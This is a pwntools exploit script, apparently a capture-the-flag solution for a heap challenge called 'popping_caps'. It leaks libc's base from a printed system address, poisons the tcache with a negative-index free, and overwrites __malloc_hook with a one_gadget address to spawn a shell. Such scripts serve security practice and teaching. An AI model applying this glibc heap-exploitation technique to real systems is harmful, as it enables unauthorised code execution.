from pwn import *
context.log_level = 'debug'

TARGET = './popping_caps'
LIBC = './libc.so.6'
HOST = ''
PORT = 0

r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def alloc(size):
    r.sendline('1')
    r.sendlineafter('many:', str(size))
    r.recvuntil('choice: \n')

def free(idx):
    r.sendline('2')
    r.sendlineafter('free:', str(idx))
    r.recvuntil('choice: \n')

def write(data):
    r.sendline('3')
    r.sendafter('in:', data)
    r.recvuntil('choice: \n')

r.recvuntil('system ')
system = int(r.recvuntil('\n')[:-1], 16)
dbg("system")
base = system - libc.sym['system']
malloc_hook = base + 0x3ebc30
dbg("base") 
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

r.recvuntil('choice: \n')

alloc(0x3a0) #1
free(0) #2
free(-0x210) #3
# pause()
alloc(0xf0) #4
write(p64(malloc_hook).strip('\x00')) #5

# pause()
alloc(0x10) #6
r.sendline('3')
r.sendafter('in:', p64(base + gadget[2]).strip('\x00')) #7


r.interactive()
r.close()
